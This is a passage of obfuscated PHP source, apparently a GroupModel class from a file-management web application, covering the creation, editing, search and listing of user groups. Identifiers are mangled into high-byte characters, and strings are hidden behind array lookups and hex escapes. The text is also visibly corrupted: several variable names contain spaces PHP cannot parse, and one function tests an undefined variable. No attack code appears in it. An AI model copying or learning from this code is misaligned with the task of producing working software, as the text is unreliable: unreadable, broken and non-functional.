$ìÆùç²ğ[1911] => $äØ­á¦Ê, $ìÆùç²ğ[1912] => $äØ­á¦Ê / $‚ÎîÒÒ», $ìÆùç²ğ[80] => $¦ôÑòğë, $ìÆùç²ğ[1913] => $™»™£); return $±­€ïŞ; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\x74\x61\142\x6c\x65\116\x61\155\x65" => "\147\162\x6f\165\x70\137\155\145\x74\x61", "\155\x65\x74\x61\106\151\x65\154\x64" => "\147\x72\157\165\160\x49\104"); protected function cacheFunctionAlias($áê¬ç«) { $Œ’ÃŞ³³ =& $_SERVER[ñˆ‹ß¿÷]; return array($Œ’ÃŞ³³[1914] => array($áê¬ç«[0], $Œ’ÃŞ³³[1915]), $Œ’ÃŞ³³[1916] => array($áê¬ç«[0], $Œ’ÃŞ³³[1917])); } protected function getInfo($ùíûüÈ, $û•ãé•Ù = false) { $Îï‰µÓÒ = $this->getInfoSimple($ùíûüÈ); if (!$Îï‰µÓÒ) { return !1; } if ($û•ãé•Ù) { return $this->_listDataApplyItem($Îï‰µÓÒ); } return $this->cacheFunctionGet($_SERVER[ñˆ‹ß¿÷][1918], $ùíûüÈ); } protected function getInfoSimple($ÀŒ•Óõ, $šÀ’ÆÚ„ = false) { $–©Æ¯´ş =& $_SERVER[ñˆ‹ß¿÷]; if ($šÀ’ÆÚ„) { $ªÜ¾¨ã = array($–©Æ¯´ş[1836] => intval($ÀŒ•Óõ)); $˜ŠÆšé¥ = $this->where($ªÜ¾¨ã)->find(); return is_array($˜ŠÆšé¥) ? $˜ŠÆšé¥ : array(); } return $this->cacheFunctionGet($–©Æ¯´ş[1919], $ÀŒ•Óõ); } protected function groupAdd($ˆ—ªÌ³) { $Ö¼®¿“ª =& $_SERVER[ñˆ‹ß¿÷]; if (!$ˆ—ªÌ³[$Ö¼®¿“ª[432]] && isset($ˆ—ªÌ³[$Ö¼®¿“ª[1836]]) && $ˆ—ªÌ³[$Ö¼®¿“ª[1836]] == 1) { if ($´ğÉÏß = $this->getInfoSimple($ˆ—ªÌ³[$Ö¼®¿“ª[1836]], !0)) { return $ˆ—ªÌ³[$Ö¼®¿“ª[1836]]; } } else { $´ğÉÏß = $this->getInfoSimple($ˆ—ªÌ³[$Ö¼®¿“ª[432]]); if (!$´ğÉÏß) { return !1; } } $ÁŞÌºöˆ = $Ö¼®¿“ª[531]; if ($´ğÉÏß[$Ö¼®¿“ª[521]]) { $ÁŞÌºöˆ = $´ğÉÏß[$Ö¼®¿“ª[521]] . $´ğÉÏß[$Ö¼®¿“ª[1836]] . $Ö¼®¿“ª[50]; } $êºô·œÁ = array($Ö¼®¿“ª[420] => $this->groupNameAuto($ˆ—ªÌ³[$Ö¼®¿“ª[432]], $ˆ—ªÌ³[$Ö¼®¿“ª[32]]), $Ö¼®¿“ª[401] => $ˆ—ªÌ³[$Ö¼®¿“ª[432]], $Ö¼®¿“ª[590] => $ÁŞÌºöˆ, $Ö¼®¿“ª[1920] => $ˆ—ªÌ³[$Ö¼®¿“ª[1823]], $Ö¼®¿“ª[1921] => 0, $Ö¼®¿“ª[1840] => 0); if (isset($ˆ—ªÌ³[$Ö¼®¿“ª[1860]])) { $êºô·œÁ[$Ö¼®¿“ª[1860]] = $ˆ—ªÌ³[$Ö¼®¿“ª[1860]]; } else { $±´¤­™Ã = $this->max($Ö¼®¿“ª[1860]); if (!$±´¤­™Ã) { $±´¤­™Ã = 0; } $êºô·œÁ[$Ö¼®¿“ª[1860]] = $±´¤­™Ã + 1; } if (!empty($ˆ—ªÌ³[$Ö¼®¿“ª[1836]])) { $êºô·œÁ[$Ö¼®¿“ª[1836]] = $ˆ—ªÌ³[$Ö¼®¿“ª[1836]]; } $¹Ğà²÷ = $this->add($êºô·œÁ); $this->setNamePinyin($¹Ğà²÷, $êºô·œÁ[$Ö¼®¿“ª[32]]); if (isset($ˆ—ªÌ³[$Ö¼®¿“ª[1922]])) { $this->metaSet($¹Ğà²÷, array($Ö¼®¿“ª[1922] => $ˆ—ªÌ³[$Ö¼®¿“ª[1922]], $Ö¼®¿“ª[1923] => $ˆ—ªÌ³[$Ö¼®¿“ª[1923]])); unset($ˆ—ªÌ³[$Ö¼®¿“ª[1922]]); unset($ˆ—ªÌ³[$Ö¼®¿“ª[1923]]); } Model($Ö¼®¿“ª[1334])->groupRootAdd($¹Ğà²÷); return $¹Ğà²÷; } protected function groupEdit($ŸÆÕ™×±, $‹ÚëÁ×) { $ºÍÜÌ¸ =& $_SERVER[ñˆ‹ß¿÷]; $ôêŸ¨Ó = $this->getInfoSimple($ŸÆÕ™×±); if (!$ôêŸ¨Ó) { return !1; } if (!empty($‹ÚëÁ×[$ºÍÜÌ¸[432]])) { $‰Å™–· = $this->getInfoSimple($‹ÚëÁ×[$ºÍÜÌ¸[432]]); if (!$‰Å™–·) { return !1; } if ($ôêŸ¨Ó[$ºÍÜÌ¸[1836]] == $‰Å™–·[$ºÍÜÌ¸[1836]]) { return !1; } if ($‹ÚëÁ×[$ºÍÜÌ¸[432]] != $ôêŸ¨Ó[$ºÍÜÌ¸[432]]) { if ($‰Å™–·[$ºÍÜÌ¸[521]] !== $ôêŸ¨Ó[$ºÍÜÌ¸[521]] && strpos($‰Å™–·[$ºÍÜÌ¸[521]], $ôêŸ¨Ó[$ºÍÜÌ¸[521]] . $ôêŸ¨Ó[$ºÍÜÌ¸[1836]] . $ºÍÜÌ¸[50]) === 0) { return !1; } $‹ÚëÁ×[$ºÍÜÌ¸[590]] = $‰Å™–·[$ºÍÜÌ¸[521]] . $‹ÚëÁ×[$ºÍÜÌ¸[432]] . $ºÍÜÌ¸[50]; $this->_changeChildLevel($ôêŸ¨Ó, $‰Å™–·); } } if (isset($‹ÚëÁ×[$ºÍÜÌ¸[32]])) { $this->setNamePinyin($ŸÆÕ™×±, $‹ÚëÁ×[$ºÍÜÌ¸[32]]); } if (isset($‹ÚëÁ×[$ºÍÜÌ¸[1922]])) { $this->metaSet($ŸÆÕ™×±, array($ºÍÜÌ¸[1922] => $‹ÚëÁ×[$ºÍÜÌ¸[1922]], $ºÍÜÌ¸[1923] => $‹ÚëÁ×[$ºÍÜÌ¸[1923]])); unset($‹ÚëÁ×[$ºÍÜÌ¸[1922]]); unset($‹ÚëÁ×[$ºÍÜÌ¸[1923]]); } $this->_clearChildrenCache($ôêŸ¨Ó); return $this->where(array($ºÍÜÌ¸[1924] => $ŸÆÕ™×±))->save($‹ÚëÁ×); } private function _clearChildrenCache($Šé˜Ô©ğ) { $ÈŠĞ¥áÛ =& $_SERVER[ñˆ‹ß¿÷]; $¬³±š = array($ÈŠĞ¥áÛ[590] => array($ÈŠĞ¥áÛ[550], $Šé˜Ô©ğ[$ÈŠĞ¥áÛ[521]] . $Šé˜Ô©ğ[$ÈŠĞ¥áÛ[1836]] . $ÈŠĞ¥áÛ[551])); $¤¬¶Õë® = $this->field($ÈŠĞ¥áÛ[1836])->where($¬³±š)->select(); foreach ($¤¬¶Õë® as $œòÌú) { $this->_clearCache($œòÌú[$ÈŠĞ¥áÛ[1836]]); } } private function _clearCache($÷İíŸµ¹) { $‚Ô±œ® =& $_SERVER[ñˆ‹ß¿÷]; $this->cacheFunctionClear($‚Ô±œ®[1918], $÷İíŸµ¹); $this->cacheFunctionClear($‚Ô±œ®[1919], $÷İíŸµ¹); } private function _changeChildLevel($­èº•˜, $Õïğ¹Óø, $µ‡ˆ‘Ö» = false) { $È«øÊË =& $_SERVER[ñˆ‹ß¿÷]; $ÇüªøŞ” = $­èº•˜[$È«øÊË[521]] . $­èº•˜[$È«øÊË[1836]] . $È«øÊË[50]; $ŠâàÆÉ = $Õïğ¹Óø[$È«øÊË[521]] . $Õïğ¹Óø[$È«øÊË[1836]] . $È«øÊË[50] . $­èº•˜[$È«øÊË[1836]] . $È«øÊË[50]; if ($µ‡ˆ‘Ö») { $ŠâàÆÉ = $Õïğ¹Óø[$È«øÊË[521]] . $Õïğ¹Óø[$È«øÊË[1836]] . $È«øÊË[50]; } $’ãóŞŠ = array($È«øÊË[590] => array($È«øÊË[550], $­èº•˜[$È«øÊË[521]] . $­èº•˜[$È«øÊË[1836]] . $È«øÊË[551])); $ÅõŒÜ = array($È«øÊË[590] => array($È«øÊË[599], "\162\x65\x70\154\x61\x63\x65\x28\160\x61\x72\x65\x6e\x74\x4c\x65\x76\145\154\x2c\x27{$ÇüªøŞ”}\47\x2c\x27{$ŠâàÆÉ}\47\x29")); $this->_clearChildrenCache($­èº•˜); $this->where($’ãóŞŠ)->data($ÅõŒÜ)->save(); } public function setNamePinyin($¤êõÜË, $°±Õ–µÈ = false) { $ß²Øå°› =& $_SERVER[ñˆ‹ß¿÷]; if (!$°±Õ–µÈ) { $…Î³Ç°¿ = $this->getInfoSimple($¤êõÜË); $°±Õ–µÈ = $…Î³Ç°¿[$ß²Øå°›[32]]; } if (!Input::check($°±Õ–µÈ, $ß²Øå°›[593])) { $this->metaSet($¤êõÜË, $ß²Øå°›[465], null); $this->metaSet($¤êõÜË, $ß²Øå°›[464], null); return; } $¶Šµƒ£è = array($ß²Øå°›[465] => str_replace($ß²Øå°›[53], $ß²Øå°›[12], Pinyin::get($°±Õ–µÈ)), $ß²Øå°›[464] => Pinyin::get($°±Õ–µÈ, $ß²Øå°›[594])); $this->metaSet($¤êõÜË, $¶Šµƒ£è); } protected function groupStatus($ô¯á¶áÃ, $»ßšÀÊÃ) { $õÛğ÷–â =& $_SERVER[ñˆ‹ß¿÷]; $ßñ¿“¥û = $this->getInfoSimple($ô¯á¶áÃ); if (!$ßñ¿“¥û) { return !1; } if ($»ßšÀÊÃ == $õÛğ÷–â[88]) { $ÑùáŞˆ = $this->parentLevelArray($ßñ¿“¥û[$õÛğ÷–â[521]]); } else { $”âüÒ“ = array($õÛğ÷–â[590] => array($õÛğ÷–â[550], $ßñ¿“¥û[$õÛğ÷–â[521]] . $ßñ¿“¥û[$õÛğ÷–â[1836]] . $õÛğ÷–â[551])); $ÑùáŞˆ = $this->where($”âüÒ“)->field($õÛğ÷–â[1836])->select(); $ÑùáŞˆ = array_to_keyvalue($ÑùáŞˆ, $õÛğ÷–â[12], $õÛğ÷–â[1836]); } $ÑùáŞˆ[] = $ßñ¿“¥û[$õÛğ÷–â[1836]]; $úİ¨—Ä = array(); foreach ($ÑùáŞˆ as $ô¯á¶áÃ) { $úİ¨—Ä[] = array($õÛğ÷–â[1836] => $ô¯á¶áÃ, $õÛğ÷–â[94] => $õÛğ÷–â[757], $õÛğ÷–â[374] => $»ßšÀÊÃ); $this->_clearCache($ô¯á¶áÃ); } return Model($õÛğ÷–â[1925])->addAll($úİ¨—Ä, array(), !0); } protected function groupRemove($ùÛŸ»İ·, $ÉòÜˆÙ¨ = false) { $“İ¬ºıª =& $_SERVER[ñˆ‹ß¿÷]; $ìîºšø£ = array($“İ¬ºıª[1836] => $ùÛŸ»İ·); $ãÎÏø¶Î = $this->where($ìîºšø£)->find(); if (!$ãÎÏø¶Î || $ãÎÏø¶Î[$“İ¬ºıª[432]] == 0) { return !1; } if (!$ÉòÜˆÙ¨) { $Ş¯º÷½¢ = $this->getInfoSimple($ãÎÏø¶Î[$“İ¬ºıª[432]]); $this->_changeChildLevel($ãÎÏø¶Î, $Ş¯º÷½¢, !0); $this->where(array($“İ¬ºıª[432] => $ùÛŸ»İ·))->save(array($“İ¬ºıª[432] => $ãÎÏø¶Î[$“İ¬ºıª[432]])); } Model($“İ¬ºıª[1925])->where($ìîºšø£)->delete(); Model($“İ¬ºıª[1926])->where($ìîºšø£)->delete(); Model($“İ¬ºıª[832])->groupRootRemove($ùÛŸ»İ·); return $this->where($ìîºšø£)->delete(); } protected function groupSort($—¶¶ùŒ›) { $Õˆº¸´Ñ =& $_SERVER[ñˆ‹ß¿÷]; $ìáğ–Û = array(); foreach ($—¶¶ùŒ› as $×ùÊ‡§± => $¥ë¨àüõ) { $ìáğ–Û[] = array($Õˆº¸´Ñ[1836], $¥ë¨àüõ, $Õˆº¸´Ñ[1860], $×ùÊ‡§± + 1); } $this->saveAll($ìáğ–Û); } public function listData() { $¤ÅÍİ¨” = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¤ÅÍİ¨”[$_SERVER[ñˆ‹ß¿÷][369]]); return $¤ÅÍİ¨”; } private function _makeOrder($äê”å¾à = '') { $†¢…û¾ =& $_SERVER[ñˆ‹ß¿÷]; $ùÄœ÷¨˜ = array($†¢…û¾[1836], $†¢…û¾[32], $†¢…û¾[1825], $†¢…û¾[200]); $Ì»„ÛŞ¬ = array($†¢…û¾[450] => $†¢…û¾[451], $†¢…û¾[452] => $†¢…û¾[453]); $úÀÍ¸¬€ = Input::get($†¢…û¾[457], $†¢…û¾[7], $†¢…û¾[1840], $ùÄœ÷¨˜); $ŞéÉÊÊå = Input::get($†¢…û¾[458], $†¢…û¾[7], $†¢…û¾[1927], array($†¢…û¾[1927], $†¢…û¾[452])); $ŞéÉÊÊå = $Ì»„ÛŞ¬[$ŞéÉÊÊå]; $äê”å¾à = $äê”å¾à . "{$úÀÍ¸¬€}\x20{$ŞéÉÊÊå}\54\40\x67\162\x6f\165\x70\111\x44\x20\x61\x73\143"; return $this->order($äê”å¾à); } public function listChild($à¸â¾ÁÛ) { $µé·ÔÉÔ =& $_SERVER[ñˆ‹ß¿÷]; $ê‚şÔó = $this->where(array($µé·ÔÉÔ[432] => $à¸â¾ÁÛ))->_makeOrder()->selectPage(200); $this->_listDataApply($ê‚şÔó[$µé·ÔÉÔ[369]]); return $ê‚şÔó; } public function listChildIds($ê»Ó¾¶€) { $ìµ¨Õõ„ =& $_SERVER[ñˆ‹ß¿÷]; if (is_string($®´ŠÀ–)) { $ê»Ó¾¶€ = explode($ìµ¨Õõ„[50], $ê»Ó¾¶€); } $–‹î„Ò = $this->where(array($ìµ¨Õõ„[1836] => array($ìµ¨Õõ„[7], $ê»Ó¾¶€)))->field($ìµ¨Õõ„[1928])->select(); if (!$–‹î„Ò) { return !1; } $…‘¦å¯Î = array(); foreach ($–‹î„Ò as $Úç¯È£À) { $…‘¦å¯Î[] = "\163\x65\x6c\145\143\x74\x20\x67\162\157\165\160\x49\x44\x20\146\x72\x6f\155\x20\x60\147\162\x6f\x75\160\x60\40\x77\150\145\162\145\x20\x70\141\162\145\x6e\x74\114\x65\166\145\x6c\40\x6c\x69\x6b\145\x20\x27{$Úç¯È£À[$ìµ¨Õõ„[521]]}{$Úç¯È£À[$ìµ¨Õõ„[1836]]}\x2c\x25\x27"; } $…‘¦å¯Î = implode($ìµ¨Õõ„[1929], $…‘¦å¯Î); $–‹î„Ò = $this->query($…‘¦å¯Î); if (!$–‹î„Ò) { return array(); } $ê»Ó¾¶€ = array_to_keyvalue($–‹î„Ò, $ìµ¨Õõ„[12], $ìµ¨Õõ„[1836]); return array_unique($ê»Ó¾¶€); } public function listByID($×ëòó÷Á) { $¹ŸÍ¿Âõ =& $_SERVER[ñˆ‹ß¿÷]; if (!$×ëòó÷Á) { return array(); } $¥Å²›Ëî = array($¹ŸÍ¿Âõ[1836] => array($¹ŸÍ¿Âõ[7], $×ëòó÷Á)); $Æ ® ‡ = $this->where($¥Å²›Ëî)->select(); $Æ ® ‡ = array_sort_keep($Æ ® ‡, $¹ŸÍ¿Âõ[1836], $×ëòó÷Á); $this->_listDataApply($Æ ® ‡); return $Æ ® ‡; } public function listSearch($³áÎ¯¬ˆ) { $™ààÛà¸ =& $_SERVER[ñˆ‹ß¿÷]; $¶Ø ›Î = $³áÎ¯¬ˆ[$™ààÛà¸[1930]]; $ğğ—±¬… = isset($³áÎ¯¬ˆ[$™ààÛà¸[1931]]) ? $³áÎ¯¬ˆ[$™ààÛà¸[1931]] : !1; if (!trim($¶Ø ›Î)) { return !1; } $¶Ø ›Î = str_replace($™ààÛà¸[1932], $™ààÛà¸[1933], $¶Ø ›Î); $×£øÍÊ¤ = array($™ààÛà¸[1836] => array($™ààÛà¸[383], "{$¶Ø ›Î}\45"), $™ààÛà¸[32] => array($™ààÛà¸[383], "\x25{$¶Ø ›Î}\x25"), $™ààÛà¸[1007] => $™ààÛà¸[1934]); if ($ğğ—±¬…) { $¯Çäú•À = $this->getInfoSimple($ğğ—±¬…); $¢‡À‹Å‰ = $¯Çäú•À[$™ààÛà¸[521]] . $ğğ—±¬… . $™ààÛà¸[551]; $×£øÍÊ¤ = array($×£øÍÊ¤, array($™ààÛà¸[521] => array($™ààÛà¸[383], $¢‡À‹Å‰))); } $×£øÍÊ¤ = $this->parseWhereLike($×£øÍÊ¤); $õ•ÖĞÉÚ = $this->_makeOrder()->where($×£øÍÊ¤)->selectPage(20); $õ•ÖĞÉÚ = $õ•ÖĞÉÚ ? $õ•ÖĞÉÚ : array($™ààÛà¸[369] => array(), $™ààÛà¸[366] => array()); if (!$õ•ÖĞÉÚ || count($õ•ÖĞÉÚ[$™ààÛà¸[369]]) < 5 && Input::check($¶Ø ›Î, $™ààÛà¸[318])) { $ìÍˆÈÄƒ = $this->groupChildrenAll($ğğ—±¬…); $Ë‘«ğÏü = $this->_searchFromMeta($™ààÛà¸[464], $¶Ø ›Î, 10, $ìÍˆÈÄƒ); $¦íÑ¹û÷ = $this->_searchFromMeta($™ààÛà¸[465], $¶Ø ›Î, 10, $ìÍˆÈÄƒ); $¢Ë—˜Éš = array_merge($Ë‘«ğÏü, $¦íÑ¹û÷, $õ•ÖĞÉÚ[$™ààÛà¸[369]]); $õ•ÖĞÉÚ[$™ààÛà¸[369]] = array_unique_by_key($¢Ë—˜Éš, $™ààÛà¸[1836]); $õ•ÖĞÉÚ[$™ààÛà¸[366]][$™ààÛà¸[367]] = count($õ•ÖĞÉÚ[$™ààÛà¸[369]]); $õ•ÖĞÉÚ[$™ààÛà¸[366]][$™ààÛà¸[368]] = ceil($õ•ÖĞÉÚ[$™ààÛà¸[366]][$™ààÛà¸[367]] / $õ•ÖĞÉÚ[$™ààÛà¸[366]][$™ààÛà¸[363]]); } $this->_listDataApply($õ•ÖĞÉÚ[$™ààÛà¸[369]]); return $õ•ÖĞÉÚ; } protected function groupChildrenAll($ä¬òî·÷) { $æÁÕâ÷Î =& $_SERVER[ñˆ‹ß¿÷]; if (!$ä¬òî·÷) { return !1; } if (is_string($ä¬òî·÷)) { $ä¬òî·÷ = array($ä¬òî·÷); } $†ÌçàÁØ = $ä¬òî·÷; foreach ($ä¬òî·÷ as $ÜÎ¸…²‡) { $ñ‡ğ™«™ = $this->getInfoSimple($ÜÎ¸…²‡); $“®‹ª¾À = array($æÁÕâ÷Î[521] => array($æÁÕâ÷Î[383], $ñ‡ğ™«™[$æÁÕâ÷Î[521]] . $ÜÎ¸…²‡ . $æÁÕâ÷Î[551])); $ê…âÍı¢ = $this->field($æÁÕâ÷Î[1836])->where($“®‹ª¾À)->select(); $†ÌçàÁØ = array_merge($†ÌçàÁØ, array_to_keyvalue($ê…âÍı¢, $æÁÕâ÷Î[12], $æÁÕâ÷Î[1836])); } return array_unique($†ÌçàÁØ); } private function _searchFromMeta($°ÃıÔÅ˜, $êç®©Áá, $§úÚêš£, $Ğ’äğµ) { $…àñÀûø =& $_SERVER[ñˆ‹ß¿÷]; $êç®©Áá = strtolower($êç®©Áá); $¨å×äÀ = array($…àñÀûø[94] => $°ÃıÔÅ˜, $…àñÀûø[374] => array($…àñÀûø[383], "\45{$êç®©Áá}\45")); $¨å×äÀ = $this->parseWhereLike($¨å×äÀ); if ($Ğ’äğµ) { $¨å×äÀ[$…àñÀûø[1836]] = array($…àñÀûø[7], $Ğ’äğµ); } $Ó–¶©”– = Model($…àñÀûø[1935])->where($¨å×äÀ)->limit($§úÚêš£)->select(); if (!$Ó–¶©”–) { return array(); } $Ó–¶©”– = array_to_keyvalue($Ó–¶©”–, $…àñÀûø[12], $…àñÀûø[1836]); $Ô®Ïƒ÷ = $this->where(array($…àñÀûø[1924] => array($…àñÀûø[7], $Ó–¶©”–)))->select(); if (!$Ô®Ïƒ÷) { return array(); } return $Ô®Ïƒ÷; } protected function _listDataApplyItem($¬š•ş÷¢) { $Ï³Öà“ = array($¬š•ş÷¢); $this->_listDataApply($Ï³Öà“); return $Ï³Öà“[0]; } protected function _listDataApply(&$ª‰Ê»±û) { $Ëß¾’ÒÕ =& $_SERVER[ñˆ‹ß¿÷]; if (!$ª‰Ê»±û) { return; } $£Ä“» = array_to_keyvalue($ª‰Ê»±û, $Ëß¾’ÒÕ[12], $Ëß¾’ÒÕ[1836]); $this->_listAppendChildren($ª‰Ê»±û); $this->_listAppendChildrenMember($ª‰Ê»±û); $this->_listAppendMeta($ª‰Ê»±û, $£Ä“»); $this->_listAppendParent($ª‰Ê»±û); $this->_listAppendSourceRoot($ª‰Ê»±û, $£Ä“»); } private function _listAppendChildren(&$È‡»¾•) { $¦¬ûÛç° =& $_SERVER[ñˆ‹ß¿÷]; $‰­ü—Š« = array_to_keyvalue($È‡»¾•, $¦¬ûÛç°[12], $¦¬ûÛç°[1836]); $™ÀßËá = array($¦¬ûÛç°[432] => array($¦¬ûÛç°[7], $‰­ü—Š«)); $Ñ’éòİô = array($¦¬ûÛç°[432], $¦¬ûÛç°[1936] => $¦¬ûÛç°[500]); $Ïàõ›¢¯ = $this->field($Ñ’éòİô)->where($™ÀßËá)->group($¦¬ûÛç°[432])->select(); $Ş™˜¦› = array_to_keyvalue($Ïàõ›¢¯, $¦¬ûÛç°[432], $¦¬ûÛç°[500]); foreach ($È‡»¾• as &$Ù¯·Æ·Î) { $¨ßûÉÀá = $Ù¯·Æ·Î[$¦¬ûÛç°[1836]]; $Ù¯·Æ·Î[$¦¬ûÛç°[1937]] = isset($Ş™˜¦›[$¨ßûÉÀá]) ? intval($Ş™˜¦›[$¨ßûÉÀá]) : !1; } unset($Ù¯·Æ·Î); } private function _listAppendChildrenMember(&$´è¨³æÙ) { $’µ†¹×‡ =& $_SERVER[ñˆ‹ß¿÷]; $Âƒç©‹ú = array_to_keyvalue($´è¨³æÙ, $’µ†¹×‡[12], $’µ†¹×‡[1836]); $Ãß¿Î»· = array($’µ†¹×‡[1836] => array($’µ†¹×‡[7], $Âƒç©‹ú)); $®ñ¸ŠŠÏ = array($’µ†¹×‡[1836], $’µ†¹×‡[1936] => $’µ†¹×‡[500]); $öÎ‚Õ¯ = Model($’µ†¹×‡[1926])->field($®ñ¸ŠŠÏ)->where($Ãß¿Î»·)->group($’µ†¹×‡[1836])->select(); $èô‚²„¯ = array_to_keyvalue($öÎ‚Õ¯, $’µ†¹×‡[1836], $’µ†¹×‡[500]); foreach ($´è¨³æÙ as &$ˆãÇáÆö) { $ü›Ë­Ü = $ˆãÇáÆö[$’µ†¹×‡[1836]]; $ˆãÇáÆö[$’µ†¹×‡[1938]] = isset($èô‚²„¯[$ü›Ë­Ü]) ? intval($èô‚²„¯[$ü›Ë­Ü]) : !1; } unset($ˆãÇáÆö); } private function _listAppendMeta(&$¿À¾ğ¦ş, $§·ƒœ™ ) { $Ï†Æ‘ÓÓ =& $_SERVER[ñˆ‹ß¿÷]; $¹şğ¾ğ  = array($Ï†Æ‘ÓÓ[1836] => array($Ï†Æ‘ÓÓ[7], $§·ƒœ™ )); $Ÿáûåé¥ = Model($Ï†Æ‘ÓÓ[1925])->where($¹şğ¾ğ )->select(); $Ÿáûåé¥ = array_to_keyvalue_group($Ÿáûåé¥, $Ï†Æ‘ÓÓ[1836]); foreach ($Ÿáûåé¥ as &$Š´ÓÎÀú) { $Š´ÓÎÀú = array_to_keyvalue($Š´ÓÎÀú, $Ï†Æ‘ÓÓ[94], $Ï†Æ‘ÓÓ[374]); } unset($Š´ÓÎÀú); foreach ($¿À¾ğ¦ş as &$¥¸ÄÀè) { $¥¸ÄÀè[$Ï†Æ‘ÓÓ[466]] = array(); if (isset($Ÿáûåé¥[$¥¸ÄÀè[$Ï†Æ‘ÓÓ[1836]]])) { $¥¸ÄÀè[$Ï†Æ‘ÓÓ[466]] = $Ÿáûåé¥[$¥¸ÄÀè[$Ï†Æ‘ÓÓ[1836]]]; } } unset($¥¸ÄÀè); } protected function parentLevelArray($Ò´ş¾»‰) { $ğ–œ´¾ä =& $_SERVER[ñˆ‹ß¿÷]; $Ò´ş¾»‰ = explode($ğ–œ´¾ä[50], trim($Ò´ş¾»‰, $ğ–œ´¾ä[50])); $Ò´ş¾»‰ = array_remove_value($Ò´ş¾»‰, $ğ–œ´¾ä[197]); return $Ò´ş¾»‰; } protected function parentInGroup($ÇäæÎíÔ, $Îİñê–Î) { $ƒõ†ç =& $_SERVER[ñˆ‹ß¿÷]; $é¡ÒÅ™ = $this->getInfoSimple($ÇäæÎíÔ); if (!$é¡ÒÅ™) { return !0; } $ÊùÜ¶ƒ = $this->parentLevelArray($é¡ÒÅ™[$ƒõ†ç[521]]); $ÊùÜ¶ƒ[] = $ÇäæÎíÔ; foreach ($ÊùÜ¶ƒ as $ÇäæÎíÔ) { if (in_array($ÇäæÎíÔ . $ƒõ†ç[12], $Îİñê–Î)) { return !0; } } return !1; } private function _listAppendParent(&$÷Ê²ŒŸı) { $Áôğş ª =& $_SERVER[ñˆ‹ß¿÷]; $ßı”Œü¢ = array(); foreach ($÷Ê²ŒŸı as &$‘ÇŸĞû) { $ßı”Œü¢[$‘ÇŸĞû[$Áôğş ª[1836]]] = $‘ÇŸĞû[$Áôğş ª[32]]; $’‚àñ™ß = $this->parentLevelArray($‘ÇŸĞû[$Áôğş ª[521]]); foreach ($’‚àñ™ß as $Ì—§‘Õ) { if (!isset($ßı”Œü¢[$Ì—§‘Õ])) { $ßı”Œü¢[$Ì—§‘Õ] = 0; } } } unset($‘ÇŸĞû); foreach ($ßı”Œü¢ as $—µĞÉŞÉ => $öÜµ×°—) { if ($öÜµ×°—) { continue; } $›ŠÅÅ“ = $this->getInfoSimple($—µĞÉŞÉ); $ßı”Œü¢[$—µĞÉŞÉ] = $›ŠÅÅ“[$Áôğş ª[32]]; } $‰Ïıï« = $GLOBALS[$Áôğş ª[6]][$Áôğş ª[89]][$Áôğş ª[1939]]; if ($GLOBALS[$Áôğş ª[503]] == $Áôğş ª[88]) { $‰Ïıï« = !1; } foreach ($÷Ê²ŒŸı as &$‘ÇŸĞû) { $’‚àñ™ß = $this->parentLevelArray($‘ÇŸĞû[$Áôğş ª[521]]); $”„ñ­ÔÂ = $Áôğş ª[12]; foreach ($’‚àñ™ß as $—µĞÉŞÉ => $Ì—§‘Õ) { if ($‰Ïıï« && $—µĞÉŞÉ == 0) { continue; } $”„ñ­ÔÂ .= $ßı”Œü¢[$Ì—§‘Õ] . $Áôğş ª[8]; } if ($’‚àñ™ß) { $”„ñ­ÔÂ .= $‘ÇŸĞû[$Áôğş ª[32]]; } $‘ÇŸĞû[$Áôğş ª[526]] = str_replace($Áôğş ª[529], $Áôğş ª[8], $”„ñ­ÔÂ); } unset($‘ÇŸĞû); } private function _listAppendSourceRoot(&$ŒÁâáüŞ, $İâ—‡) { $Æ¶İÛ®„ =& $_SERVER[ñˆ‹ß¿÷]; $œĞä¬¦ = Model($Æ¶İÛ®„[832])->listSourceRoot(SourceModel::TYPE_GROUP, $İâ—‡); $œĞä¬¦ = array_to_keyvalue($œĞä¬¦, $Æ¶İÛ®„[505]); $œĞä¬¦ = array_remove_key($œĞä¬¦, $Æ¶İÛ®„[505]); foreach ($ŒÁâáüŞ as &$¤æ‚Ëé) { $¤æ‚Ëé[$Æ¶İÛ®„[86]] = $œĞä¬¦[$¤æ‚Ëé[$Æ¶İÛ®„[1836]]] ? $œĞä¬¦[$¤æ‚Ëé[$Æ¶İÛ®„[1836]]] : array(); } unset($¤æ‚Ëé); } protected function groupMerge($ƒêº¾½Ñ) { $ƒêº¾½Ñ = array_values(array_unique($ƒêº¾½Ñ)); $ÃÖ«Ê˜¦ = array(); for ($”Ú´ß˜ = 0; $”Ú´ß˜ < count($ƒêº¾½Ñ); $”Ú´ß˜++) { $³ĞÎ½ë× = !1; for ($Ò¸à²²À = 0; $Ò¸à²²À < count($ƒêº¾½Ñ); $Ò¸à²²À++) { if ($”Ú´ß˜ == $Ò¸à²²À) { continue; } if ($this->isParentOf($ƒêº¾½Ñ[$Ò¸à²²À], $ƒêº¾½Ñ[$”Ú´ß˜])) { $³ĞÎ½ë× = !0; break; } } if (!$³ĞÎ½ë×) { $ÃÖ«Ê˜¦[] = $ƒêº¾½Ñ[$”Ú´ß˜]; } } return $ÃÖ«Ê˜¦; } protected function isParentOf($¤¯ˆĞÍÎ, $ä°„ÈÙõ) { $ÑØ°¡ßÁ =& $_SERVER[ñˆ‹ß¿÷]; if (!$¤¯ˆĞÍÎ || !$ä°„ÈÙõ || $¤¯ˆĞÍÎ == $ä°„ÈÙõ) { return !1; } $Ö‡¬°ô = $this->getInfoSimple($¤¯ˆĞÍÎ); $ÆÛîÜ«· = $this->getInfoSimple($ä°„ÈÙõ); $³™‹È£© = $Ö‡¬°ô[$ÑØ°¡ßÁ[521]] . $¤¯ˆĞÍÎ . $ÑØ°¡ßÁ[50]; if (substr($ÆÛîÜ«·[$ÑØ°¡ßÁ[521]], 0, strlen($³™‹È£©)) == $³™‹È£©) { return !0; } return !1; } public function groupShowRoot($èºâƒÔ, $ÄÔ§»èç = false) { $ºì×Àã =& $_SERVER[ñˆ‹ß¿÷]; $ó†Ö—ˆù = $this->getInfo($èºâƒÔ); if (!$ó†Ö—ˆù) { return array(); } $Îì…‚Í» = $this->parentLevelArray($ó†Ö—ˆù[$ºì×Àã[521]]); $Íšô¤¼ = array($èºâƒÔ); if (count($Îì…‚Í») == 0) { return $Íšô¤¼; } if ($ÄÔ§»èç && count($Îì…‚Í») == 1) { return $Íšô¤¼; } if (!$ó†Ö—ˆù[$ºì×Àã[466]] || 